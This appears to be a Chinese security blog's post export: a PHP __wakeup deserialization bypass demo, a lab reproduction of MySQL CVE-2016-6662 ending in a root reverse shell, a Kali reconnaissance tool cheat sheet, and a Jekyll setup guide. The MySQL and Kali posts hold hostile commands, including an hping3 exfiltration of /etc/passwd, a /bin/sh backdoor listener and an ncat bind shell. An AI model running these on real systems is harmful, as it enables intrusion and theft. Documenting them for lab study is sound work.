魔术方法在PHP5中有两个魔术方法__sleep()方法和__wakeup()方法，在对象串行化的时候，会调用一个sleep()方法来完成一 些睡前的事情；而在重新醒来，即由二进制串重新组成一个对象的时候，则会自动调用PHP的另一个函数wakeup()，做一些对象醒来就要做的动作。sleep()函数不接受任何参数， 但返回一个数组，其中包含需要串行化的属性。末被包含的属性将在串行化时被忽略，如果没有sleep()方法，PHP将保存所有属性。当然，还有其他的魔术方法。 123456789101112131415161718192021222324252627282930313233&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . "my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __sleep() &#123; // 此时，属性$age将被删除！！！ $arr = array("name", "friends"); return($arr); &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 $this-&gt;name = "Orleven"; &#125;&#125;$p1 = new Person("Bob", 20,array("Alice","Jhon") );$p1_string = serialize($p1); //把一个对象序列化，返一个字符串echo $p1_string . "&lt;br&gt;"; //串行化的字符串我们通常不去解析$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2$p2-&gt;say();?&gt; 具体输出： 12O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Orleven,my age is my friends has Alice Jhon . 不久之前刚出来的__wakeup()引发的漏洞。大意是指，当我们反序列化一个对象时，如果它的属性发生了变化，就会导致wakeup函数中不会执行，那么如果__wakeup()中存在一些重要的语句，就会导致不会被执行。 对于如下代码： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(7);class Person&#123; var $name; var $age; var $friends; function __construct($name = "", $age = "",$friends = array()) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;friends = $friends; &#125; function say() &#123; echo "I am " . $this-&gt;name . ",my age is " . $this-&gt;age . ",my friends has "; foreach ($this-&gt;friends as $friend)&#123; echo $friend." "; &#125; echo ".&lt;br&gt;"; &#125; function __wakeup() &#123;//重新生成对象时，并重新赋值$age为40 echo "Wakeup...&lt;br/&gt;"; $this-&gt;name = "Orleven"; echo "Wakeuped&lt;br/&gt;"; &#125; function __destruct()&#123; //Do something $this-&gt;say(); echo "Destructed&lt;br/&gt;"; &#125;&#125; 如果执行如下代码：123$p1_string = 'O:6:"Person":3:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p1_string."&lt;br/&gt;";$p2 = unserialize($p1_string); //把一个序列化的字符串反序列化形成对象$p2 具体输出： 12345O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; Wakeup... Wakeuped I am Orleven,my age is 20,my friends has Alice Jhon . Destructed 如果执行如下代码：123$p3_string = 'O:6:"Person":4:&#123;s:4:"name";s:3:"Bob";s:3:"age";i:20;s:7:"friends";a:2:&#123;i:0;s:5:"Alice";i:1;s:4:"Jhon";&#125;&#125;'; //把一个对象序列化，返一个字符串echo $p3_string."&lt;br/&gt;";$p4 = unserialize($p3_string); //把一个序列化的字符串反序列化形成对象$p4 具体输出： 123O:6:&quot;Person&quot;:4:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:20;s:7:&quot;friends&quot;;a:2:&#123;i:0;s:5:&quot;Alice&quot;;i:1;s:4:&quot;Jhon&quot;;&#125;&#125; I am Bob,my age is 20,my friends has Alice Jhon . Destructed 发现wakeup并没有执行。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>serialize</tag>
        <tag>magic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql 提权漏洞 CVE-2016-6662]]></title>
    <url>%2F2016%2F09%2F29%2Fmysql-root-code-execution-CVE-2016-6662%2F</url>
    <content type="text"><![CDATA[概述最近出了一个mysql提权漏洞，趁热练练手。 利用前提 mysql_hookandroot_lib.c mysql拥有my.cnf写权限 mysql root用户可执行 set global general_log_file = &#39;my.cnf&#39;; sql语句 需要file权限 环境搭建安装mysql 5.6.3212345678910111213141516171819202122232425$ wget http://ftp.kaist.ac.kr/mysql/Downloads/MySQL-5.6/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz$ sudo apt-get install libaio-dev（或者libaio1） $ chmod 777 tmp$ groupadd mysql$ useradd -r -g mysql mysql$ cd /usr/local/$ tar zxvf /tmp/mysql-5.6.32-linux-glibc2.5-x86_64.tar.gz $ ln -s mysql-5.6.32-linux-glibc2.5-x86_64 mysql$ cd mysql $ chown -R mysql .$ chgrp -R mysql .$ scripts/mysql_install_db --user=mysql$ chown -R root .$ chown -R mysql data$ cp my.cnf /etc/my.cnf$ bin/mysqld_safe --user=mysql &amp;$ cp support-files/mysql.server /etc/init.d/mysql.server$ ./bin/mysqladmin -u root password '123456'$ ./bin/mysqladmin -uroot -p123456 shutdown$ bin/mysqld_safe --user=mysql &amp;# 如果想在任何地方都能直接使用mysql命令，需要设置环境变量：$ vi /etc/environment # 在PATH=“…”最后添加mysql可执行文件所在路径（在这里是:/usr/local/mysql/bin）$ source /etc/environment 版本信息123456789101112131415161718192021222324$ lsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.4 LTSRelease: 14.04Codename: trusty$ ./bin/mysqladmin -u root -p versionEnter password: ./bin/mysqladmin Ver 8.42 Distrib 5.6.32, for linux-glibc2.5 on x86_64Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Server version 5.6.32Protocol version 10Connection Localhost via UNIX socketUNIX socket /tmp/mysql.sockUptime: 2 min 54 secThreads: 1 Questions: 10 Slow queries: 0 Opens: 67 Flush tables: 1 Open tables: 60 Queries per second avg: 0.057 进程属性123$ ps -aux | grep mysqlroot 23 0.0 0.0 4440 748 ? S 10:02 0:00 /bin/sh bin/mysqld_safe --user=mysqlmysql 122 13.0 45.0 985540 457724 ? Sl 10:02 0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/d1190820d670.err --pid-file=/usr/local/mysql/data/d1190820d670.pid 可以看出，mysqld_safe封装脚本是以root权限启动的，而主要的mysqld进程是用较低权限的mysql用户启动的。 复现准备修改my.cnf权限12# 将/usr/local/mysql/my.cnf$ chown mysql:mysql /usr/local/mysql/my.cnf 创建attacker用户，并赋予file，select，insert权限，创建用于实验的数据库pocdb123CREATE DATABASE pocdb;GRANT FILE ON *.* TO 'attacker'@'%' IDENTIFIED BY 'p0cpass!';GRANT SELECT, INSERT, CREATE ON `pocdb`.* TO 'attacker'@'%'; 复现修改一下mysql_hookandroot_lib.c的ip，port和my.cnf的位置：123#define ATTACKERS_IP "192.168.0.1"#define SHELL_PORT 6033#define INJECTED_CONF "/usr/local/mysql/my.cnf" 修改一下0ldSQL_MySQL_RCE_exploit.py的port和my.cnf的位置,然后执行1$ python 0ldSQL_MySQL_RCE_exploit.py -dbuser attacker -dbpass 'p0cpass!' -dbhost 192.168.0.1 -dbname pocdb -mycnf /usr/local/mysql/my.cnf 执行成功后会在my.cnf里添加如下：12345678910111213/usr/local/mysql/bin/mysqld, Version: 5.6.32 (MySQL Community Server (GPL)). started with:Tcp port: 3306 Unix socket: /tmp/mysql.sockTime Id Command Argument160929 9:37:14 1 Query select "# 0ldSQL_MySQL_RCE_exploit got here :)[mysqld]malloc_lib='/usr/local/mysql/data/mysql_hookandroot_lib.so'[abyss]" INTO void 1 Query SET global general_log = off 虽然直接把日志写在my.cnf里重启mysql时会执行失败，但是不用担心,config_cleanup() 这个函数会清除这些。 重启mysql1234Listening on [0.0.0.0] (family 0, port 12344)Connection from [192.168.0.4] port 12344 [tcp/*] accepted (family 2, sport 34434)whoamiroot]]></content>
      <categories>
        <category>root code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Information Gathering]]></title>
    <url>%2F2016%2F09%2F27%2Fkali-information-gathering%2F</url>
    <content type="text"><![CDATA[概述Kali 里预装了很多安全与取证的相关工具，但是我所了解的却只有sqlmap、msf、nmap等少数几个，对于其他的却并没过多关注。于是今天想着整理一下Kali有关信息收集的工具，便于以后备查。 信息收集acccheck：描述：该工具被设计为一个密码字典攻击的工具，目标Windows身份验证通过SMB协议。 ace：描述：不明。 amap：描述：一个服务器枚举工具，使用这个工具可以识别正运行在一个指定端口或一个范围端口上的应用程序。用法：1$ amap -bq 192.168.1.110 1-1000 Automater描述：automater是分析URL的域名，IP地址，和MD5哈希OSINT工具。用法：12$ automater baidu.com$ automater -s robtex 50.116.53.73 braa描述：一个SNMP的扫描工具用法：1$ braa public@192.168.0.1:.1.3.6.* casefile描述：服务枚举：如DNS枚举用法：1$ casefile cdpsnarf描述：网络嗅探器，从CDP数据包中提取信息用法：1$ cdpsnarf -i eth0 -w cdpsnarf.pcap cisco-torch描述：快速发现远程Cisco的主机上运行Telnet、SSH、WEB、SNMP服务和启动NTP和字典攻击的服务发现。用法：1$ cisco-torch -A 192.168.99.202 copy-router-config描述：从思科设备上运行的SNMP拷贝配置文件。用法：1$ copy-router-config.pl 192.168.1.1 192.168.1.15 private dmitry描述：收集可能的子域，电子邮件地址，正常运行时间的信息，TCP端口扫描，查找，和更多。用法：1$ dmitry baidu.com dnmap描述：DNmap是一款基于Nmap的分布式框架，使用客户端/服务端架构，服务器接收命令并发送至客户端进行Nmap安全扫描，扫描完毕后，客户端返回扫描结果。用法：12345678# dnmap_server：$ echo "nmap -F 192.168.1.0/24 -v -n -oA sub1" &gt;&gt; dnmap.txt$ echo "nmap -F 192.168.0.0/24 -v -n -oA sub0" &gt;&gt; dnmap.txt$ dnmap_server -f dnmap.txt# dnmap_client：# (dnmap_server的ip)(dnmap_client的别名)$ dnmap_client -s 192.168.1.15 -a dnmap-client1 dnsenum描述：枚举域DNS信息和发现不连续的IP模块。用法：1$ dnsenum --noreverse -o mydomain.xml example.com dnsmap描述：枚举域DNS信息。用法：1$ dnsmap example.com -w /usr/share/wordlists/dnsmap.txt dnsrecon描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t std --xml dnsrecon.xml dnstracer描述：直接出来目标服务器的 DNS名字 和 IP用法：1$ dnstracer -r 3 -v example.com dnswalk描述：DNS的调试器。它执行特定区域的区域传输，并检查数据库在许多方面的内部一致性，以及准确性。用法：12$ dnswalk example.com.$ dnswalk -r -d example.com. dotdotpwn.pl描述:测试发现软件例如HTTP、FTP、TFTP服务器遍历目录的漏洞，网络平台如CMS、ERP、博客等。用法：1$ dotdotpwn.pl -m http -h 192.168.1.1 -M GET enum4linux描述:枚举Windows主机和Samba 主机。用法：1$ enum4linux -U -o 192.168.1.200 enumiax描述: Inter Asterisk Exchange 协议 的用户名蛮力枚举。 enumiax可能在两种不同的模式操作； 顺序用户名猜测或字典攻击。用法：1$ enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1 Fierce描述: ip 扫描器用法：1$ fierce -dns example.com fragroute描述: fragroute能够截取、修改和重写向外发送的报文，实现大部分在了Secure Networks Insertion, Evasion, and Denial of Service: Eluding Network Intrusion Detection中叙述的IDS欺骗技术，包括IP、TCP层的数据包碎片以及数据包数据重叠等。用法：12345# fragroute：$ fragroute 192.168.1.123# fragtest ：$ fragtest ip-tracert frag-new 192.168.1.123 ghost-phisher描述: 是无线和以太网的安全审计和攻击软件用法：1$ ghost-phisher GoLismero描述: web漏洞扫描用法：1234567891011121314# 扫描一个网站，并显示在屏幕上的结果:$ golismero scan http://www.0535code.com# 获取nmap结果，扫描发现所有主机写HTML报告:$ golismero scan -i nmap_output.xml -o report.html# 获取结果OpenVAS和它们显示在屏幕上，但不扫描任何东西:$ golismero import -i openvas_output.xml# 显示所有可用配置文件的列表:$ golismero profiles# 显示所有可用插件的列表:$ golismero plugins# 显示所有信息和插件:$ golismero info brute_*# 从以前的扫描中转储数据库:$ golismero dump -db example.db -o dump.sql hping3描述: hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。用法：1234567891011121314151617# 使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。$ hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10# 端口扫描$ hping3 -I eth0 -S 192.168.10.1 -p 80# 对目标机发起大量SYN连接$ hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000# 文件传输 # 接收端： $ hping3 192.168.1.159 --listen signature --safe --icmp # 发送端： $ hping3 192.168.1.108 --icmp -d 100 --sign signature --file /etc/passwd# 木马功能 # 被控制端： $ hping3 127.0.0.1 --listen signature --safe --udp -p 12345 | /bin/sh # 控制端： $ echo ls &gt; test.cmd $ hping3 127.0.0.1 -p 12345 -d 100 --udp --sign signature --file ./test.cmd intrace描述:InTrace 是一个类似 traceroute 的应用，用户可以针对已建立的 TCP 连接跟踪其 IP 的跳跃。用法:1$ intrace -h www.example.com -p 80 -s 4 lbd描述:检测是否一个给定的域使用DNS或HTTP负载平衡（通过服务器：日期：服务器响应头和之间的差别）。用法:1$ lbd example.com maltego描述:收集DNS信息等。用法:1$ maltego masscan描述:快速的端口扫描工具。用法:123456# 扫描202.203.122.122的80端口，速率为10Kpps$ masscan -p 80 202.203.122.122 --rate=10000 # 扫描202.203.122.122的0-8100的端口，扫描结果输出到output.txt（二进制）（--banners选项值旗标，或者指纹）$ masscan -p 0-8100 202.203.122.122 --banners -oB output.txt # 打开显示模式，读取output.txt中的数据，并以xml的格式写到2.txt中$ masscan --open --banners --readscan output.txt -oX 2.txt Miranda描述:操作系统探测工具。用法:1234567# 打开网卡eth0$ miranda -v -i eth0 # 自动搜索upnp主机 upnp&gt; msearch upnp&gt; host list # 查看该主机的upnp设备列表 upnp&gt; host get [index] nmap描述:网络探测工具和安全/端口扫描器。用法:123456789101112131415161718192021222324252627$ Nmap [ 扫描类型 ... ] [ 通用选项 ] &#123; 扫描目标说明 &#125;$ nmap -v -A -sV 192.168.1.1# 全面扫描：$ nmap -T4 -A targetip# 主机发现：$ nmap -T4 -sn targetip# 端口扫描：$ nmap -T4 targetip# 服务扫描：$ nmap -T4 -sV targetip# 操作系统扫描：$ nmap -T4 -O targetip# SYN扫描:$ nmap -sS -T4 targetip# FIN扫描:$ nmap -sF -T4 targetip# ACK扫描:$ nmap -sA -T4 targetip# UDP扫描:$ NMAP -sU targetip# 漏洞扫描：$ nmap -sS -sV --script=vulscan/vulscan.nse target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target$ nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target$ nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target$ nmap -sV --script=vuln target$ nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target nping描述:网络数据包生成工具/平实用程序。用法:1$ nping --tcp -p 22 --flags syn --ttl 2 192.168.1.1 ndiff描述:实用工具Nmap扫描的结果比较。用法:1$ ndiff yesterday.xml today.xml ncat描述:连接和重定向的套接字。用法:1$ ncat -v --exec "/bin/bash" --allow 192.168.1.123 -l 4444 --keep-open p0f描述:是一款被动探测工具,通过分析网络数据包来判断操作系统用法:1$ p0f -i eth0 -p -o /tmp/p0f.log Recon-ng描述:与msf类似，Recon-ng框架是一个强大的工具，使用它可以自动的收集信息和网络侦查。用法:1234567891011121314151617$ recon-ng # 查看所有命令： [recon-ng][default]&gt; help # 查看所有有效的模块列表： [recon-ng][default]&gt; show modules # 使用recon/domains-hosts/baidu_site模块，枚举baidu网站的子域： [recon-ng][default]&gt; use recon/domains-hosts/baidu_site # 查看该模块下可配置选项参数： [recon-ng][default][baidu_site]&gt; show options # 配置SOURCE选项参数： [recon-ng][default][baidu_site]&gt; set SOURCE baidu.com # 启动信息收集： [recon-ng][default][baidu_site]&gt; run # 查看获取的数据： [recon-ng][default]&gt; use reporting/csv # 创建报告： [recon-ng][default][csv]&gt; run searchsploit描述: 从Exploit Database搜索exp用法：12$ searchsploit oracle windows remote$ searchsploit linux kernel 2.6 setoolkit描述: 社会工程师工具包用法：123456789$ setoolkit # 根据自己的需要，选择相应的编号进行操作: set&gt; 1 set&gt; 4 # 根据自己的目标系统选择相应的攻击载荷: set:payloads&gt; 2 # 输入攻击者的ip、端口： set:payloads&gt; IP address for the payload listener (LHOST):192.168.0.212 set:payloads&gt; Enter the PORT for the reverse listener:1234 smtp-user-enum描述: SMTP用户枚举是一个工具，用于枚举操作系统级别的用户帐户在Solaris通过SMTP服务（邮件）。用法：1$ smtp-user-enum -M VRFY -u root -t 192.168.1.25 snmpcheck描述: SNMP枚举工具。用法：1$ snmpcheck -t 192.168.1.2 -c public sslcaudit描述: 实用的自动化测试的SSL / TLS的客户端来抵抗中间人攻击。用法：1$ caudit -l 0.0.0.0:443 -v 1 SSLsplit描述: 中间人攻击，将https协议强制替换为http。。用法：1$ sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080 SSLyze描述: 是一款使用Python实现的SSL扫描工具，它可以扫描出SSL中一些经典的配置错误。用法：1$ sslyze --regular www.example.com theharvester描述: 邮箱挖掘器。用法：1$ theharvester -d kali.org -l 500 -b google tlssled描述: TLSSLed是一个Linux bash脚本,它的功能是测试目标SSL/TLS(HTTPS)WEB 服务器的安全性。TLSSLed基于sslscan，功能包括：测试目标是否支持SSLv2协议、NULL cipher等等。用法：1$ tlssled 192.168.1.1 443 tshark描述: 可以直接过滤数据包导出用法：1$ tshark -f "tcp port 80" -i eth0 urlcrazy描述: 钓鱼域名。用法：1$ urlcrazy -k dvorak -r example.com whatweb描述: WhatWeb是一款网站指纹识别工具，主要针对的问题是：“这个网站使用的什么技术？”WhatWeb可以告诉你网站搭建使用的程序，包括何种CMS系统、什么博客系统、Javascript库、web服务器、内嵌设备等。WhatWeb有超过900个插件，并且可以识别版本号、email地址、账号、web框架、SQL错误等等。用法：1$ whatweb www.example.com Wireshark描述: 流量分析。用法：1$ wireshark xspy描述: 键盘记录器用法：1$ xspy yersinia描述: 是国外的一款专门针对交换机执行第二层攻击的一个攻击工具。用法：1$ yersinia -G zaproxy描述: 一个易于使用交互式的用于web应用程序漏洞挖掘的渗透测试工具。用法：1$ zaproxy]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>kali</tag>
        <tag>information gathering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Github + Markdown + Jekyll 搭建博客]]></title>
    <url>%2F2016%2F07%2F04%2Fgithub-markdown-jekyll%2F</url>
    <content type="text"><![CDATA[概述Github + Markdown + Jekyll 搭建博客的步骤如下，不过首先得注册Github账号，以及创建一个Repository,命名格式为：username.github.io（username 必须和账号一致。）这样就生成了属于你的Github下的网页,其中过程可以参照GitHub Pages。 安装安装Kekyll需要以下环境： Ruby2.0以上 RubyGems Linux,Unix,Mac OS 安装Ruby2.012$ sudo apt-get install ruby2.0 $ sudo apt-get install ruby2.0-dev 由于我的Ubuntu 14.04默认的Ruby是1.9.3，而Ruby 2.0则需要用命令ruby2.0运行，程序前必须设定好运行版本，不然会运行错误。于是我强制替换了/usr/bin目录下与Ruby相关的符号链接到Ruby 2.0对应的版本，进行了如下步骤： 12345678$ cd /usr/bin/ $ ln -sf ruby2.0 ruby $ ln -sf gem2.0 gem $ ln -sf erb2.0 erb $ ln -sf irb2.0 irb $ ln -sf rake2.0 rake $ ln -sf rdoc2.0 rdoc $ ln -sf testrb2.0 testrb 替换完后还要更新下gem： 12$ gem update \-\-system $ gem pristine \-\-all 这时Ruby的默认版本就已经切换到Ruby 2.0了。当然虽然这样做比较暴力，但也是可以还原的，如果想切换会Ruby 1.9.3，只需要运行（请注意在Ubuntu 14.04中，Ruby 1.9.3的名称为ruby1.9.1）,这里另外附上还原Ruby 1.9.3的方法： 12345678910$ cd /usr/bin/ $ ln -sf ruby1.9.1 ruby $ ln -sf gem1.9.1 gem $ ln -sf erb1.9.1 erb $ ln -sf irb1.9.1 irb $ ln -sf rake1.9.1 rake $ ln -sf rdoc1.9.1 rdoc $ ln -sf testrb1.9.1 testrb $ gem update \-\-system $ gem pristine \-\-all 安装Jekyll12$ gem install jekyll $ gem install bundler 安装模板解释器RDiscount默认模板是Maruku，这里替换为RDiscount。Maruku是纯ruby写的Markdown模板解释器。RDiscount是C写的模板解释器，重点是它的效率比Maruku快很多。 1$ gem install rdiscount 新建一个Jekyll目录1$ jekyll new blogname 然后bundle12$ bundle update $ bundle install 启动server因为Jekyll自带一个服务器，所以可以直接运行服务。只不过它默认是只能本机访问4000端口（使用--host 服务器IP参数，可允许外部IP访问），而且并不是后台运行（可用--detach后台运行）。 1$ jekyll serve \-\-host 自己外网IP \-\-detach OK！ 可以用浏览器访问这个服务器http://IP:4000。关闭后台程序： 1$ kill -9 pid 修改配置1$ vim _config.yml 修改里面的url为username.github.io（username是你的github账户名） 上传github1234$ git init $ git add \-\-all $ git commit -m "博客" $ git push origin maste 过一会就可已访问username.github.io（username是你的github账户名）了 Jekyll主题接下来再说说jeykll的目录结构。Jekyll的核心其实是一个文本转换引擎。它的概念其实就是：你用你最喜欢的标记语言来写文章，可以是Markdown,也可以是 Textile, 或者就是简单的 HTML, 然后 Jekyll 就会帮你套入一个或一系列的布局中。在整个过程中你可以设置 URL 路径，你的文本在布局中的显示样式等等。这些都可以通过纯文本编辑来实现，最终生成的静态页面就是你的成果。 至于Jekyll的主题，你可以参照jekyllthemes。找到合适的主题之后，只要修改_config.yml即可，然后就是再_posts里写文章了，文章的命名格式为YYYY-MM-DD-name-of-post.md。而Markdown的语法可以参照Markdown语法,至于Markdown的编辑器，最好不要用vim，去下个专门的编辑器。]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>jekyll</tag>
        <tag>github</tag>
        <tag>blog</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
</search>
